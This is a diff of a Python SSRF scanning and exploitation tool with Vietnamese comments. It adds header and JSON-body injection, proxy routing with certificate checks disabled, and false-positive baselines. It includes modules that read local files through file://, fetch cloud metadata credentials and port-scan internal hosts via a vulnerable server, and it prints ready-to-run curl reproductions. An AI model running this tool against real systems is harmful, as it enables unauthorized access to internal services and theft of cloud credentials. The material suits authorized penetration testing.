@@ -27,6 +27,7 @@ import http.cookiejar
 import ipaddress
 import json
 import secrets
+import ssl
 import sys
 import threading
 import time
@@ -243,9 +244,8 @@ class Finding:
 
 @dataclass
 class Baseline:
-    status: int | None
-    length: int
-    elapsed: float
+    clean_len: int      # do dai response (da bo chuoi payload bi echo) khi fetch THAT BAI
+    elapsed: float      # thoi gian phan hoi khi fetch that bai
 
 
 @dataclass
@@ -262,80 +262,135 @@ SUSPICIOUS_PARAMS = {
     "document", "domain", "callback", "webhook", "proxy", "load", "page", "data",
 }
 
+# Cac header server hay dung de di fetch -> cung la diem chen SSRF pho bien.
+SSRF_HEADERS = ["Referer", "X-Forwarded-For", "X-Forwarded-Host",
+                "X-Real-IP", "True-Client-IP", "Forwarded"]
 
-# Moi "diem chen" la cap (location, param): location = 'url' (query string) hoac 'data' (body POST).
-def find_injection_points(url, data, explicit_param):
-    if FUZZ in url:
+
+@dataclass
+class Target:
+    """Mo ta request GOC se bi fuzz (thay cho viec truyen roi tung tham so)."""
+    url: str
+    body: str | None = None            # noi dung body (form hoac JSON) dang chuoi
+    is_json: bool = False              # body co phai JSON khong
+    headers: dict = field(default_factory=dict)
+
+
+# -------------------- Ho tro JSON body --------------------
+def _json_string_paths(obj, prefix=""):
+    """Liet ke duong dan (dotted) toi moi gia tri CHUOI trong JSON.
+    Vi du {"a": {"url": "x"}} -> ['a.url']."""
+    paths = []
+    if isinstance(obj, dict):
+        for k, v in obj.items():
+            paths += _json_string_paths(v, f"{prefix}{k}.")
+    elif isinstance(obj, list):
+        for i, v in enumerate(obj):
+            paths += _json_string_paths(v, f"{prefix}{i}.")
+    elif isinstance(obj, str):
+        paths.append(prefix[:-1])      # bo dau cham o cuoi
+    return paths
+
+
+def _json_set(obj, path, value):
+    """Gan `value` vao `path` (dotted) trong obj. Sua truc tiep tren obj."""
+    keys = path.split(".")
+    cur = obj
+    for k in keys[:-1]:
+        cur = cur[int(k)] if isinstance(cur, list) else cur[k]
+    last = keys[-1]
+    if isinstance(cur, list):
+        cur[int(last)] = value
+    else:
+        cur[last] = value
+
+
+# -------------------- Xac dinh diem chen (location, key) --------------------
+# location: 'url' (query) | 'form' (body x-www-form-urlencoded) | 'json' (body JSON) | 'header'
+def find_points(target: Target, explicit_param):
+    # 1) Co marker FUZZ -> uu tien tuyet doi, chi chen dung do
+    if FUZZ in target.url:
         return [("url", FUZZ)]
-    if data and FUZZ in data:
-        return [("data", FUZZ)]
+    if target.body and FUZZ in target.body:
+        return [("json" if target.is_json else "form", FUZZ)]
 
     points = []
-    if explicit_param:
-        q = dict(parse_qsl(urlparse(url).query))
-        d = dict(parse_qsl(data)) if data else {}
-        if explicit_param in q:
-            points.append(("url", explicit_param))
-        if explicit_param in d:
-            points.append(("data", explicit_param))
-        return points or [("url", explicit_param)]
+    query = dict(parse_qsl(urlparse(target.url).query))
 
-    # Tu dong: uu tien tham so ten nghi ngo, khong co thi lay tat ca
-    q = dict(parse_qsl(urlparse(url).query))
-    sus_q = [k for k in q if k.lower() in SUSPICIOUS_PARAMS]
-    points += [("url", k) for k in (sus_q or list(q.keys()))]
-    if data:
-        d = dict(parse_qsl(data))
-        sus_d = [k for k in d if k.lower() in SUSPICIOUS_PARAMS]
-        points += [("data", k) for k in (sus_d or list(d.keys()))]
+    # 2) Nguoi dung chi dinh ten tham so cu the
+    if explicit_param:
+        if explicit_param in query:
+            points.append(("url", explicit_param))
+        if target.body and not target.is_json and explicit_param in dict(parse_qsl(target.body)):
+            points.append(("form", explicit_param))
+        points = points or [("url", explicit_param)]
+    else:
+        # 3) Tu dong: tham so trong query string (uu tien ten nghi ngo)
+        sus = [k for k in query if k.lower() in SUSPICIOUS_PARAMS]
+        points += [("url", k) for k in (sus or list(query.keys()))]
+        # 4) Tu dong: cac truong trong body
+        if target.body and target.is_json:
+            try:
+                points += [("json", p) for p in _json_string_paths(json.loads(target.body))]
+            except Exception:
+                pass
+        elif target.body:
+            form = dict(parse_qsl(target.body))
+            sus = [k for k in form if k.lower() in SUSPICIOUS_PARAMS]
+            points += [("form", k) for k in (sus or list(form.keys()))]
+
+    # 5) Luon thu them cac header hay dinh SSRF
+    points += [("header", h) for h in SSRF_HEADERS]
     return points
 
 
-def _inject_str(s: str, param: str, value: str) -> str:
-    """Chen value vao param trong mot query-string (dung cho ca URL va body)."""
-    if param == FUZZ:
-        return s.replace(FUZZ, value)
-    qs = dict(parse_qsl(s))
-    qs[param] = value
-    return urlencode(qs)
+def apply_injection(target: Target, loc, key, value):
+    """Chen `value` vao (loc, key). Tra ve (url, body_bytes, headers) de gui di."""
+    url = target.url
+    headers = dict(target.headers)
+    body = target.body
 
-
-def _apply(url, data, loc, param, value):
-    """Tra ve (url_moi, data_moi) sau khi chen payload vao dung vi tri."""
-    if loc == "url":
-        if param == FUZZ:
-            return url.replace(FUZZ, value), data
+    if loc == "header":
+        headers[key] = value
+    elif key == FUZZ:                               # thay marker FUZZ truc tiep
+        if loc == "url":
+            url = url.replace(FUZZ, value)
+        else:
+            body = (body or "").replace(FUZZ, value)
+    elif loc == "url":                              # thay 1 tham so trong query
         parts = urlparse(url)
-        return urlunparse(parts._replace(query=_inject_str(parts.query, param, value))), data
-    else:  # loc == "data"
-        return url, _inject_str(data or "", param, value)
+        q = dict(parse_qsl(parts.query)); q[key] = value
+        url = urlunparse(parts._replace(query=urlencode(q)))
+    elif loc == "form":                             # thay 1 truong trong body form
+        q = dict(parse_qsl(body or "")); q[key] = value
+        body = urlencode(q)
+    elif loc == "json":                             # thay 1 truong trong body JSON
+        obj = json.loads(body); _json_set(obj, key, value); body = json.dumps(obj)
+
+    return url, (body.encode() if body is not None else None), headers
 
 
 class Scanner:
-    def __init__(self, *, oast_host=None, timeout=8.0, concurrency=10,
-                 time_threshold=5.0, method="GET", headers=None,
-                 data=None, cookie=None) -> None:
+    def __init__(self, *, oast_host=None, timeout=6.0, concurrency=20,
+                 time_threshold=5.0, method="GET", base_headers=None,
+                 proxy=None) -> None:
         self.oast_host = oast_host
         self.timeout = timeout
         self.concurrency = concurrency
         self.time_threshold = time_threshold
         self.method = method.upper()
-        self.headers = dict(headers or {})
-        self.data = data            # body POST (chuoi x-www-form-urlencoded, co the chua FUZZ)
-        if cookie:
-            self.headers["Cookie"] = cookie
-        # Opener co cookie jar -> giu session xuyen suot (ke ca sau khi login)
-        self.cookiejar = http.cookiejar.CookieJar()
-        self.opener = urllib.request.build_opener(
-            urllib.request.HTTPCookieProcessor(self.cookiejar))
+        self.base_headers = dict(base_headers or {})     # header goc (cookie, content-type, -H)
+        # Opener: giu cookie jar (session), va di qua proxy neu co (vd Burp 127.0.0.1:8080).
+        handlers = [urllib.request.HTTPCookieProcessor(http.cookiejar.CookieJar())]
+        self.cookiejar = handlers[0].cookiejar
+        if proxy:
+            handlers.append(urllib.request.ProxyHandler({"http": proxy, "https": proxy}))
+            handlers.append(urllib.request.HTTPSHandler(context=ssl._create_unverified_context()))
+        self.opener = urllib.request.build_opener(*handlers)
 
-    def login(self, auth_url, user, password, user_field="username", pass_field="password",
-              extra: dict | None = None) -> bool:
+    def login(self, auth_url, user, password, user_field="username", pass_field="password") -> bool:
         """Dang nhap bang form de lay session cookie (POST x-www-form-urlencoded)."""
-        fields = {user_field: user, pass_field: password}
-        if extra:
-            fields.update(extra)
-        body = urlencode(fields).encode()
+        body = urlencode({user_field: user, pass_field: password}).encode()
         try:
             req = urllib.request.Request(auth_url, data=body, method="POST",
                                          headers={"Content-Type": "application/x-www-form-urlencoded"})
@@ -349,18 +404,16 @@ class Scanner:
 
     def cookie_header(self) -> str:
         """Gom cookie hien co (tu --cookie va/hoac session sau login) thanh 1 chuoi."""
-        parts = []
-        if self.headers.get("Cookie"):
-            parts.append(self.headers["Cookie"])
+        parts = [self.base_headers["Cookie"]] if self.base_headers.get("Cookie") else []
         parts += [f"{c.name}={c.value}" for c in self.cookiejar]
         return "; ".join(parts)
 
-    def _request(self, url: str, data: str | None = None):
+    def _request(self, url, body=None, headers=None):
+        """Gui 1 request. Tra ve (_Resp | None, elapsed_giay, ten_loi | None)."""
         start = time.perf_counter()
-        method = "POST" if data else self.method
-        body = data.encode() if data else None
+        method = "POST" if body else self.method
         try:
-            req = urllib.request.Request(url, data=body, method=method, headers=self.headers)
+            req = urllib.request.Request(url, data=body, method=method, headers=headers or {})
             with self.opener.open(req, timeout=self.timeout) as r:
                 content = r.read(20000).decode("utf-8", "replace")
                 return _Resp(r.status, content, len(content)), time.perf_counter() - start, None
@@ -374,25 +427,33 @@ class Scanner:
         except Exception as e:
             return None, time.perf_counter() - start, type(e).__name__
 
-    def _baseline(self, url, data, loc, param) -> Baseline:
-        u, d = _apply(url, data, loc, param, "http://example.com/")
-        resp, elapsed, _ = self._request(u, d)
-        return Baseline(resp.status if resp else None, resp.length if resp else 0, elapsed)
+    def _dead_baseline(self, target, loc, key) -> Baseline:
+        """Baseline 'host chet': chen 1 URL CHAC CHAN khong ket noi duoc (.invalid).
+        -> cho biet app tra ve gi khi fetch THAT BAI. Dung lam moc so sanh de bot bao nham.
+        Do dai duoc tinh sau khi BO chuoi payload bi echo lai (tranh nhieu do URL khac nhau)."""
+        dead = f"http://dead-{secrets.token_hex(4)}.invalid/"
+        url, body, headers = apply_injection(target, loc, key, dead)
+        resp, elapsed, _ = self._request(url, body, headers)
+        clean_len = len(resp.body.replace(dead, "")) if resp else 0
+        return Baseline(clean_len=clean_len, elapsed=elapsed)
 
     def _analyze(self, p, resp, elapsed, err, baseline) -> Finding | None:
         body = resp.body.lower() if resp is not None else ""
 
+        # (1) OAST: nhan duoc callback ve canary => chac chan
         if p.technique == "oast" and INTERACTIONS.has_token(p.oast_token):
             return Finding("", p, "CONFIRMED",
                            f"Nhan callback OAST voi token {p.oast_token}",
                            resp.status if resp else None, elapsed)
 
+        # (2) Direct: response lo dau hieu noi bo => chac chan
         for sig in p.signatures:
             if sig.lower() in body:
                 return Finding("", p, "CONFIRMED",
                                f"Response chua dau hieu noi bo: '{sig}'",
                                resp.status if resp else None, elapsed)
 
+        # (3) Time-based: phan hoi cham bat thuong so voi baseline => do tin cay cao
         if p.technique == "time":
             if elapsed >= self.time_threshold and elapsed > baseline.elapsed * 3 + 1:
                 return Finding("", p, "LIKELY",
@@ -400,52 +461,62 @@ class Scanner:
                                f"-> server co the dang co ket noi IP noi bo",
                                resp.status if resp else None, elapsed)
 
+        # (4) Diff: so voi baseline 'host chet' SAU KHI bo payload echo.
+        #     Chi bao khi noi dung thuc su khac -> tranh bao nham (app boc response).
         if p.technique in ("direct", "bypass", "port-scan", "scheme") and resp is not None:
-            if resp.status and resp.status < 400 and abs(resp.length - baseline.length) > 200:
+            clean_len = len(resp.body.replace(p.value, ""))
+            if resp.status and resp.status < 400 and abs(clean_len - baseline.clean_len) > 120:
                 return Finding("", p, "POSSIBLE",
-                               f"Response khac baseline (len {resp.length} vs "
-                               f"{baseline.length}, status {resp.status})",
+                               f"Noi dung khac han luc fetch that bai "
+                               f"(len {clean_len} vs {baseline.clean_len}) -> co fetch duoc gi do",
                                resp.status, elapsed)
         return None
 
-    def scan_point(self, url, data, loc, param, payloads) -> list[Finding]:
-        label = f"{loc}:{param}"  # vd 'url:FUZZ' hoac 'data:url'
-        baseline = self._baseline(url, data, loc, param)
-        findings: list[Finding] = []
+    def scan(self, target: Target, explicit_param):
+        """Quet toan bo: tao danh sach cong viec (diem chen x payload) roi chay SONG SONG het."""
+        points = find_points(target, explicit_param)
 
-        def run(p: Payload):
-            u, d = _apply(url, data, loc, param, p.value)
-            resp, elapsed, err = self._request(u, d)
-            f = self._analyze(p, resp, elapsed, err, baseline)
+        # Baseline rieng cho tung diem chen + danh sach cong viec.
+        baselines, tasks = {}, []
+        for pt in points:
+            loc, key = pt
+            baselines[pt] = self._dead_baseline(target, loc, key)
+            # Moi diem chen co bo payload rieng (token OAST moi) -> callback xac dinh dung diem chen.
+            payloads = build_payloads(oast_host=self.oast_host)
+            if loc == "header":        # header chi thu payload manh (OAST + direct) cho nhanh
+                payloads = [p for p in payloads if p.technique in ("oast", "direct")]
+            tasks += [(pt, p) for p in payloads]
+
+        def run(task):
+            (loc, key), p = task
+            url, body, headers = apply_injection(target, loc, key, p.value)
+            resp, elapsed, err = self._request(url, body, headers)
+            f = self._analyze(p, resp, elapsed, err, baselines[(loc, key)])
             if f:
-                f.param = label
-            return f
+                f.param = f"{loc}:{key}"
+            return f, task
 
+        findings, oast_tasks = [], []
         with ThreadPoolExecutor(max_workers=self.concurrency) as pool:
-            for f in pool.map(run, payloads):
+            for f, task in pool.map(run, tasks):
                 if f:
                     findings.append(f)
+                if task[1].technique == "oast":
+                    oast_tasks.append(task)
 
-        # OAST callback co the toi tre -> cho roi quet lai
-        oast_payloads = [p for p in payloads if p.technique == "oast"]
-        if oast_payloads:
-            time.sleep(2.0)
-            for p in oast_payloads:
-                if INTERACTIONS.has_token(p.oast_token) and not any(
-                    f.payload.oast_token == p.oast_token for f in findings
-                ):
-                    findings.append(Finding(label, p, "CONFIRMED",
-                                             f"Nhan callback OAST (tre) token {p.oast_token}"))
-        return findings
+        # OAST callback co the toi TRE -> cho 1 lan roi quet lai cac token chua bao.
+        have = {f.payload.oast_token for f in findings if f.payload.oast_token}
+        if oast_tasks:
+            time.sleep(1.5)
+            for (loc, key), p in oast_tasks:
+                if p.oast_token not in have and INTERACTIONS.has_token(p.oast_token):
+                    findings.append(Finding(f"{loc}:{key}", p, "CONFIRMED",
+                                            f"Nhan callback OAST (tre) token {p.oast_token}"))
+                    have.add(p.oast_token)
 
-    def scan(self, url: str, explicit_param: str | None):
-        points = find_injection_points(url, self.data, explicit_param)
-        payloads = build_payloads(oast_host=self.oast_host)
-        results: list[Finding] = []
-        for loc, param in points:
-            results.extend(self.scan_point(url, self.data, loc, param, payloads))
-        labels = [f"{loc}:{p}" for loc, p in points]
-        return results, labels, payloads
+        labels = [f"{loc}:{key}" for loc, key in points]
+        payloads_per_point = len(build_payloads(oast_host=self.oast_host))
+        return findings, labels, payloads_per_point
 
 
 # =============================================================================
@@ -465,20 +536,25 @@ VERDICT_NAME = {"CONFIRMED": "CONFIRMED", "LIKELY": "FIRM", "POSSIBLE": "TENTATI
 SEVERITY = "High"  # SSRF nhin chung xep muc nghiem trong cao (CVSS ~7-9)
 
 
-def print_report(findings, params, payloads) -> None:
+def print_report(findings, params, payloads_count, only_confirmed=False) -> None:
     print("\n" + "=" * 66)
     print(" SSRF SCAN FINDINGS")
     print("=" * 66)
-    print(f" Injection points : {', '.join(params) or '(none)'}")
-    print(f" Payloads/point   : {len(payloads)}")
+    print(f" Injection points : {len(params)} ({', '.join(params[:6])}{' ...' if len(params) > 6 else ''})")
+    print(f" Payloads/point   : {payloads_count}")
     print(f" Total findings   : {len(findings)}")
     print("-" * 66)
 
-    if not findings:
-        print(" No SSRF indicators detected.")
+    shown = findings
+    if only_confirmed:
+        shown = [f for f in findings if f.verdict in ("CONFIRMED", "LIKELY")]
+        print(f" (--only-confirmed: hien {len(shown)}/{len(findings)}, an cac TENTATIVE)")
+
+    if not shown:
+        print(" No SSRF indicators detected." if not findings else " (khong co phat hien CONFIRMED/FIRM)")
         return
 
-    for i, f in enumerate(sorted(findings, key=lambda x: VERDICT_ORDER.get(x.verdict, 9)), 1):
+    for i, f in enumerate(sorted(shown, key=lambda x: VERDICT_ORDER.get(x.verdict, 9)), 1):
         label = VERDICT_LABEL.get(f.verdict, f.verdict)
         print(f"\n [{i:02d}] {label}  Severity: {SEVERITY}  |  Type: SSRF")
         print(f"      Injection : {f.param}")
@@ -489,15 +565,15 @@ def print_report(findings, params, payloads) -> None:
             print(f"      Response  : HTTP {f.status}  |  {f.elapsed:.2f}s")
 
 
-def _reconstruct(url, data, label, value):
-    """Tu label 'loc:param' dung lai (url, data) day du da chen payload."""
-    loc, _, param = label.partition(":")
-    if loc not in ("url", "data"):  # phong truong hop label la thang truc tiep
-        loc, param = "url", label
-    return _apply(url, data, loc, param, value)
+def _reconstruct(target: Target, label, value):
+    """Tu label 'loc:key' dung lai request day du da chen payload.
+    Tra ve (url, body_str | None, loc, key)."""
+    loc, _, key = label.partition(":")
+    url, body_bytes, _ = apply_injection(target, loc, key, value)
+    return url, (body_bytes.decode() if body_bytes else None), loc, key
 
 
-def print_conclusion(findings, url, params, data=None, cookie=None) -> None:
+def print_conclusion(target: Target, findings, cookie=None) -> None:
     """Tom tat ket luan + danh sach payload tai hien duoc (proof-of-concept)."""
     print("\n" + "#" * 66)
     print("#  SUMMARY")
@@ -519,33 +595,43 @@ def print_conclusion(findings, url, params, data=None, cookie=None) -> None:
         return
     print(f"  Severity: {SEVERITY}   |   Type: SSRF (CWE-918)")
 
-    # Gom cac payload hoat dong (uu tien theo muc do), loai trung
+    # Gom payload hoat dong, loai trung. TENTATIVE chi in toi da 5 cho gon.
     working = sorted(findings, key=lambda x: VERDICT_ORDER.get(x.verdict, 9))
-    seen = set()
     print("\n  PROOF-OF-CONCEPT - working payloads (copy for report / reproduction):")
     print("  " + "-" * 62)
+    seen, tentative_shown = set(), 0
     for f in working:
-        key = (f.param, f.payload.value)
-        if key in seen:
+        if (f.param, f.payload.value) in seen:
             continue
-        seen.add(key)
-        full_url, full_data = _reconstruct(url, data, f.param, f.payload.value)
+        seen.add((f.param, f.payload.value))
+        if f.verdict == "POSSIBLE":
+            tentative_shown += 1
+            if tentative_shown > 5:
+                continue
+        full_url, full_body, loc, key = _reconstruct(target, f.param, f.payload.value)
         print(f"  {VERDICT_LABEL.get(f.verdict, f.verdict)}  {f.param}  ({f.payload.technique})")
         print(f"      payload   : {f.payload.value}")
         print(f"      full URL  : {full_url}")
-        if full_data:
-            print(f"      POST body : {full_data}")
+        if full_body:
+            print(f"      body      : {full_body}")
+        if loc == "header":
+            print(f"      header    : {key}: {f.payload.value}")
         print(f"      rationale : {f.evidence}")
         print("  " + "-" * 62)
+    if tentative_shown > 5:
+        print(f"  (... con {tentative_shown - 5} TENTATIVE nua, dung -o de xem day du trong JSON)")
 
     # Lenh curl tai hien nhanh payload manh nhat
     best = working[0]
-    bu, bd = _reconstruct(url, data, best.param, best.payload.value)
+    bu, bb, bloc, bkey = _reconstruct(target, best.param, best.payload.value)
     curl = "curl -s"
     if cookie:
         curl += f' -b "{cookie}"'
-    if bd:
-        curl += f' --data "{bd}"'
+    if bloc == "header":
+        curl += f' -H "{bkey}: {best.payload.value}"'
+    if bb:
+        curl += (f' -H "Content-Type: application/json" --data \'{bb}\''
+                 if target.is_json else f' --data "{bb}"')
     curl += f' "{bu}"'
     print("\n  Reproduce the strongest finding:")
     print(f"      {curl}")
@@ -602,33 +688,33 @@ def _snippet_around(body: str, needle: str, span: int = 320) -> str:
     return " ".join(seg.split())
 
 
-def _extract(scanner, url, data, loc, param, payload_value):
-    u, d = _apply(url, data, loc, param, payload_value)
-    return scanner._request(u, d)
+def _extract(scanner, target, loc, key, payload_value):
+    """Gui 1 payload qua diem chen (dung Target moi), tra ve (resp, elapsed, err)."""
+    url, body, headers = apply_injection(target, loc, key, payload_value)
+    return scanner._request(url, body, headers)
 
 
-def mod_readfiles(scanner, url, data, loc, param) -> None:
+def mod_readfiles(scanner, target, loc, key) -> None:
     print("\n  [module: readfiles] doc file noi bo qua file://")
     hit = False
     for payload in EXPLOIT_FILES:
-        resp, elapsed, err = _extract(scanner, url, data, loc, param, payload)
+        resp, elapsed, err = _extract(scanner, target, loc, key, payload)
         if resp is None:
             continue
-        body = resp.body
-        matched = next((sig for sig in FILE_SIGNATURES if sig.lower() in body.lower()), None)
+        matched = next((sig for sig in FILE_SIGNATURES if sig.lower() in resp.body.lower()), None)
         if matched:
             hit = True
             print(f"    [+] {payload}")
-            print(f"        {_snippet_around(body, matched, 360)}")
+            print(f"        {_snippet_around(resp.body, matched, 360)}")
     if not hit:
         print("    [-] khong doc duoc file nao (co the bi chan scheme file://).")
 
 
-def mod_cloud(scanner, url, data, loc, param) -> None:
+def mod_cloud(scanner, target, loc, key) -> None:
     print("\n  [module: cloud] lay metadata dich vu cloud")
     hit = False
     for name, endpoint in CLOUD_ENDPOINTS:
-        resp, elapsed, err = _extract(scanner, url, data, loc, param, endpoint)
+        resp, elapsed, err = _extract(scanner, target, loc, key, endpoint)
         if resp is None or resp.status is None or resp.status >= 400 or not resp.body.strip():
             continue
         # chi nhan khi co GIA TRI credential/metadata that (tranh bao nham do app echo URL)
@@ -642,15 +728,15 @@ def mod_cloud(scanner, url, data, loc, param) -> None:
         print("    [-] khong lay duoc metadata (khong chay tren cloud, hoac bi chan IP 169.254.x).")
 
 
-def mod_portscan(scanner, url, data, loc, param, host="127.0.0.1") -> None:
+def mod_portscan(scanner, target, loc, key, host="127.0.0.1") -> None:
     print(f"\n  [module: portscan] quet cong noi bo tren {host} qua SSRF")
     # Baseline: cong gan nhu chac chan DONG -> de so sanh phan biet open/closed
     # (nhieu app boc moi response trong trang cua no, nen khong the chi check 'co response').
-    bresp, bt, berr = _extract(scanner, url, data, loc, param, f"http://{host}:1/")
+    bresp, bt, berr = _extract(scanner, target, loc, key, f"http://{host}:1/")
     base_len = bresp.length if bresp else -1
     found_open = False
     for port in PORTSCAN_PORTS:
-        resp, elapsed, err = _extract(scanner, url, data, loc, param, f"http://{host}:{port}/")
+        resp, elapsed, err = _extract(scanner, target, loc, key, f"http://{host}:{port}/")
         if resp is None and elapsed >= scanner.timeout - 0.4:
             state = "FILTERED (timeout)"
         elif resp is None:
@@ -665,23 +751,25 @@ def mod_portscan(scanner, url, data, loc, param, host="127.0.0.1") -> None:
         print("    [i] khong thay cong mo ro rang (hoac SSRF khong cho fetch IP noi bo).")
 
 
-def run_exploit(scanner, url, data, points, modules) -> None:
-    if not points:
+def run_exploit(scanner, target, points, modules) -> None:
+    # Uu tien diem chen trong url/form/json (doc duoc response); tranh header.
+    usable = [pt for pt in points if pt[0] != "header"] or points
+    if not usable:
         print("\n [!] Khong co diem chen de khai thac.")
         return
-    loc, param = points[0]  # dung diem chen dau tien
+    loc, key = usable[0]
     print("\n" + "#" * 66)
-    print(f"#  EXPLOITATION  (diem chen: {loc}:{param})")
+    print(f"#  EXPLOITATION  (diem chen: {loc}:{key})")
     print("#" * 66)
     want = set(modules)
     if "all" in want:
         want = {"readfiles", "cloud", "portscan"}
     if "readfiles" in want:
-        mod_readfiles(scanner, url, data, loc, param)
+        mod_readfiles(scanner, target, loc, key)
     if "cloud" in want:
-        mod_cloud(scanner, url, data, loc, param)
+        mod_cloud(scanner, target, loc, key)
     if "portscan" in want:
-        mod_portscan(scanner, url, data, loc, param)
+        mod_portscan(scanner, target, loc, key)
     print("\n" + "#" * 66 + "\n")
 
 
@@ -829,8 +917,12 @@ def main() -> int:
     ap.add_argument("-H", "--header", action="append", help="Header 'Key: Value' (lap lai duoc).")
     ap.add_argument("-i", "--interactive", action="store_true",
                     help="Che do hoi tung thong tin (url/param/cookie/login/oob...).")
-    ap.add_argument("--data", help="Body POST (x-www-form-urlencoded, co the chua FUZZ).")
+    ap.add_argument("--data", help="Body POST (form hoac JSON, co the chua FUZZ).")
+    ap.add_argument("--json", action="store_true", help="Coi --data la JSON (chen vao cac truong JSON).")
     ap.add_argument("--cookie", help="Cookie/session san co, vd 'session=abc; token=xyz'.")
+    ap.add_argument("--proxy", help="Di qua proxy, vd 'http://127.0.0.1:8080' (Burp) de xem/replay traffic.")
+    ap.add_argument("--only-confirmed", action="store_true",
+                    help="Chi hien phat hien CONFIRMED/FIRM (an TENTATIVE cho gon).")
     # Dang nhap de lay session
     ap.add_argument("--auth-url", help="Endpoint dang nhap (POST) de lay session cookie.")
     ap.add_argument("--auth-user", help="Username dang nhap.")
@@ -838,8 +930,8 @@ def main() -> int:
     ap.add_argument("--auth-user-field", default="username", help="Ten truong username (mac dinh 'username').")
     ap.add_argument("--auth-pass-field", default="password", help="Ten truong password (mac dinh 'password').")
     # Mang / OOB
-    ap.add_argument("--timeout", type=float, default=8.0, help="Timeout moi request (giay).")
-    ap.add_argument("--concurrency", type=int, default=10, help="So request song song.")
+    ap.add_argument("--timeout", type=float, default=6.0, help="Timeout moi request (giay).")
+    ap.add_argument("--concurrency", type=int, default=20, help="So request song song.")
     ap.add_argument("--time-threshold", type=float, default=5.0, help="Nguong giay cho time-based.")
     ap.add_argument("--oast-host", "--oob-url", dest="oast_host",
                     help="Server OOB/OAST ben ngoai: dan URL/host tu Burp Collaborator "
@@ -896,12 +988,23 @@ def main() -> int:
         print("     LUU Y: tool chi TU DONG xac nhan callback khi dung --oast-listen (canary cuc bo).")
         print("     Voi dich vu ngoai (requestrepo/interactsh...), hay xem callback tren dashboard cua ho.")
 
-    # Header: tu request (-r) truoc, roi -H ghi de
+    # Header goc: tu request (-r) truoc, roi -H ghi de; them cookie.
     headers = {**req_headers, **parse_headers(args.header)}
+    if args.cookie:
+        headers["Cookie"] = args.cookie
+
+    # Body la JSON? (do co --json, hoac Content-Type, hoac body trong giong JSON)
+    ct = next((v for k, v in headers.items() if k.lower() == "content-type"), "")
+    is_json = args.json or "json" in ct.lower() or (
+        bool(args.data) and args.data.lstrip().startswith(("{", "[")))
+    if args.data and "content-type" not in {k.lower() for k in headers}:
+        headers["Content-Type"] = "application/json" if is_json else "application/x-www-form-urlencoded"
+
+    target = Target(url=args.url, body=args.data, is_json=is_json, headers=headers)
     scanner = Scanner(
         oast_host=args.oast_host, timeout=args.timeout, concurrency=args.concurrency,
         time_threshold=args.time_threshold, method=args.method,
-        headers=headers, data=args.data, cookie=args.cookie)
+        base_headers=headers, proxy=args.proxy)
 
     # Dang nhap lay session neu duoc cung cap
     if args.auth_url and args.auth_user is not None:
@@ -909,12 +1012,14 @@ def main() -> int:
         scanner.login(args.auth_url, args.auth_user, args.auth_pass or "",
                       args.auth_user_field, args.auth_pass_field)
 
+    if args.proxy:
+        print(f" [*] Di qua proxy: {args.proxy}")
     print(f" [*] Bat dau quet: {args.url}")
     if args.data:
-        print(f" [*] Body POST : {args.data}")
+        print(f" [*] Body ({'JSON' if is_json else 'form'}): {args.data}")
     print()
     try:
-        findings, params, payloads = scanner.scan(args.url, args.param)
+        findings, params, payloads_count = scanner.scan(target, args.param)
     except KeyboardInterrupt:
         print("\n [!] Da dung.")
         return 130
@@ -922,9 +1027,8 @@ def main() -> int:
         if oast_server:
             oast_server.stop()
 
-    print_report(findings, params, payloads)
-    print_conclusion(findings, args.url, params, data=args.data,
-                     cookie=scanner.cookie_header() or None)
+    print_report(findings, params, payloads_count, only_confirmed=args.only_confirmed)
+    print_conclusion(target, findings, cookie=scanner.cookie_header() or None)
     if args.output:
         save_json(findings, params, args.output)
 
@@ -933,8 +1037,7 @@ def main() -> int:
     if args.exploit:
         modules.append("all")
     if modules:
-        points = find_injection_points(args.url, args.data, args.param)
-        run_exploit(scanner, args.url, args.data, points, modules)
+        run_exploit(scanner, target, find_points(target, args.param), modules)
 
     serious = [f for f in findings if f.verdict in ("CONFIRMED", "LIKELY")]
     return 1 if serious else 0
